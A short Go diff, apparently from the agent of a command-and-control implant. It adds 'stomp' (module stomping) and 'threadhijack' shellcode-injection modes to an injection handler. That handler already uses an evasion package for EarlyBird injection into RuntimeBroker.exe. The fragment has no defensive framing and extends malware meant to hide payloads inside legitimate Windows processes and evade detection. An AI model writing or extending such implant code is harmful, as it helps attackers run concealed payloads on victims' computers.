@@ -73,6 +73,10 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 			host = `C:\Windows\System32\RuntimeBroker.exe`
 		}
 		injectErr = evasion.EarlyBirdInject(sc, host)
+	case "stomp":
+		injectErr = evasion.StompInject(sc, pid)
+	case "threadhijack":
+		injectErr = evasion.ThreadHijackInject(sc, pid)
 	default:
 		injectErr = injectCreateThread(sc, pid)
 	}
